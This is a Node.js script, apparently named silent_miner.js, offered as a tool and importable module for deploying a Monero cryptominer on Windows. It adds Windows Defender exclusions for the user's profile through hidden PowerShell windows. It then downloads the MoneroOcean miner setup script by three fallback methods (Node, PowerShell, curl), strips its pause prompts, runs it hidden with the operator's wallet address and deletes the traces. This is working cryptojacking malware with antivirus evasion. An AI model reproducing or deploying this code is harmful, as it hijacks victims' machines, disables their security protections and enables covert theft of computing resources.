// js version by Shaacidyne
// Usage 1 - Use node js and run the script: node silent_miner.js YOUR_WALLET_ADDRESS_HERE
// Usage 2 - Deployed as a module:
//
//const { deployMiner } = require('./miner_deploy.js');
//
//(async () => {
//    const result = await deployMiner('YOUR_WALLET_ADDRESS');
//    console.log(`Deployment ${result ? 'succeeded' : 'failed'}`);
//})();
//

const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');
const http = require('http');

function executePowerShell(command, timeout = 30000) {
    return new Promise((resolve) => {
        const psCommand = `powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "${command}"`;
        
        const proc = spawn('powershell.exe', [
            '-WindowStyle', 'Hidden',
            '-NoProfile',
            '-NonInteractive',
            '-ExecutionPolicy', 'Bypass',
            '-Command', command
        ], {
            windowsHide: true,
            stdio: 'ignore',
            detached: false
        });

        const timer = setTimeout(() => {
            try {
                proc.kill();
            } catch (e) {}
            resolve(false);
        }, timeout);

        proc.on('exit', (code) => {
            clearTimeout(timer);
            resolve(code === 0);
        });

        proc.on('error', () => {
            clearTimeout(timer);
            resolve(false);
        });
    });
}

async function addDefenderExclusion(folderPath) {
    try {
        const command = `Add-MpPreference -ExclusionPath '${folderPath}'`;
        
        const proc = spawn('powershell.exe', [
            '-WindowStyle', 'Hidden',
            '-NoProfile',
            '-ExecutionPolicy', 'Bypass',
            '-Command', command
        ], {
            windowsHide: true,
            stdio: 'ignore',
            detached: false
        });

        setTimeout(() => {
            try { proc.kill(); } catch (e) {}
        }, 500);

        return true;
    } catch (e) {
        return false;
    }
}

function downloadFile(url, outputPath) {
    return new Promise((resolve) => {
        const urlObj = new URL(url);
        const protocol = urlObj.protocol === 'https:' ? https : http;

        const file = fs.createWriteStream(outputPath);
        let fileSize = 0;

        const request = protocol.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        }, (response) => {
            if (response.statusCode === 301 || response.statusCode === 302) {
                file.close();
                fs.unlinkSync(outputPath);
                downloadFile(response.headers.location, outputPath).then(resolve);
                return;
            }

            if (response.statusCode !== 200) {
                file.close();
                fs.unlinkSync(outputPath);
                resolve(false);
                return;
            }

            response.pipe(file);
            response.on('data', (chunk) => {
                fileSize += chunk.length;
            });

            file.on('finish', () => {
                file.close(() => {
                    resolve(fileSize > 100);
                });
            });
        });

        request.on('error', (err) => {
            try {
                file.close();
                fs.unlinkSync(outputPath);
            } catch (e) {}
            resolve(false);
        });

        request.setTimeout(30000, () => {
            request.destroy();
            try {
                file.close();
                fs.unlinkSync(outputPath);
            } catch (e) {}
            resolve(false);
        });
    });
}

async function downloadFilePS(url, outputPath) {
    const command = `
        $ProgressPreference = 'SilentlyContinue';
        $ErrorActionPreference = 'SilentlyContinue';
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        try {
            Invoke-WebRequest -Uri '${url}' -OutFile '${outputPath}' -UseBasicParsing
        } catch {
            exit 1
        }
    `.replace(/\n/g, ' ');

    return await executePowerShell(command, 30000);
}

function downloadFileCurl(url, outputPath) {
    return new Promise((resolve) => {
        const proc = spawn('curl.exe', [
            '-s', '-L',
            '-o', outputPath,
            url
        ], {
            windowsHide: true,
            stdio: 'ignore'
        });

        const timer = setTimeout(() => {
            try {
                proc.kill();
            } catch (e) {}
            resolve(false);
        }, 30000);

        proc.on('exit', (code) => {
            clearTimeout(timer);
            resolve(code === 0);
        });

        proc.on('error', () => {
            clearTimeout(timer);
            resolve(false);
        });
    });
}

function validateFile(filePath, minSize = 100) {
    try {
        const stats = fs.statSync(filePath);
        return stats.size >= minSize;
    } catch (e) {
        return false;
    }
}

function modifyScript(scriptPath) {
    try {
        let content = fs.readFileSync(scriptPath, 'utf8');

        content = content.replace(/\bpause\b/gi, 'rem paused');
        content = content.replace(/\bPAUSE\b/g, 'rem paused');
        content = content.replace(/\bPause\b/g, 'rem paused');

        if (!content.startsWith('@echo off')) {
            content = '@echo off\r\n' + content;
        }

        fs.writeFileSync(scriptPath, content, 'utf8');
        return true;
    } catch (e) {
        return false;
    }
}

function executeScript(scriptPath, args, cwd, timeout = 600000) {
    return new Promise((resolve) => {
        const proc = spawn('cmd.exe', ['/c', scriptPath, args], {
            cwd: cwd,
            windowsHide: true,
            stdio: 'ignore',
            detached: false
        });

        const timer = setTimeout(() => {
            try {
                proc.kill();
            } catch (e) {}
            resolve(false);
        }, timeout);

        proc.on('exit', (code) => {
            clearTimeout(timer);
            resolve(true); 
        });

        proc.on('error', () => {
            clearTimeout(timer);
            resolve(false);
        });
    });
}

async function deployMiner(walletAddress) {
    try {
        const userProfile = process.env.USERPROFILE || os.homedir();
        
        const moneroPath = path.join(userProfile, 'moneroocean');
        await addDefenderExclusion(moneroPath);
        await addDefenderExclusion(userProfile);

        const scriptUrl = 'https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat';
        const tempDir = os.tmpdir();
        const tempScript = path.join(tempDir, `mo_${process.pid}.bat`);

        let downloaded = false;

        console.log('[*] Attempting to download miner setup script...');

        if (!downloaded) {
            console.log('[*] Trying native Node.js download...');
            downloaded = await downloadFile(scriptUrl, tempScript);
            if (downloaded && validateFile(tempScript)) {
                console.log('[+] Download successful (Node.js)');
            } else {
                downloaded = false;
            }
        }

        if (!downloaded) {
            console.log('[*] Trying PowerShell download...');
            downloaded = await downloadFilePS(scriptUrl, tempScript);
            if (downloaded && validateFile(tempScript)) {
                console.log('[+] Download successful (PowerShell)');
            } else {
                downloaded = false;
            }
        }

        if (!downloaded) {
            console.log('[*] Trying curl download...');
            downloaded = await downloadFileCurl(scriptUrl, tempScript);
            if (downloaded && validateFile(tempScript)) {
                console.log('[+] Download successful (curl)');
            } else {
                downloaded = false;
            }
        }

        if (!downloaded) {
            console.error('[-] Failed to download script');
            return false;
        }

        console.log('[*] Modifying script...');
        if (!modifyScript(tempScript)) {
            console.error('[-] Failed to modify script');
            try { fs.unlinkSync(tempScript); } catch (e) {}
            return false;
        }

        console.log('[*] Executing miner setup...');
        const success = await executeScript(tempScript, walletAddress, userProfile);

        console.log('[*] Cleaning up...');
        try {
            fs.unlinkSync(tempScript);
        } catch (e) {}

        if (success) {
            console.log('[+] Miner deployment completed successfully');
        } else {
            console.log('[-] Miner deployment failed or timed out');
        }

        return success;

    } catch (error) {
        console.error('[-] Error:', error.message);
        return false;
    }
}

async function main() {
    console.log('='.repeat(70));
    console.log('Miner Deployment Tool (Node.js)');
    console.log('='.repeat(70));

    const walletAddress = process.argv[2] || 'enter_your_wallet_here';

    if (walletAddress === 'enter_your_wallet_here') {
        console.log('[!] WARNING: Using default wallet address');
        console.log('[!] Usage: node miner_deploy.js <wallet_address>');
        console.log('');
    }

    console.log(`[*] Wallet Address: ${walletAddress}`);
    console.log('');

    const result = await deployMiner(walletAddress);

    console.log('');
    console.log('='.repeat(70));
    console.log(`[*] Result: ${result ? 'SUCCESS' : 'FAILED'}`);
    console.log('='.repeat(70));

    process.exit(result ? 0 : 1);
}

module.exports = {
    deployMiner,
    addDefenderExclusion,
    downloadFile,
    executeScript
};

if (require.main === module) {
    main();
}
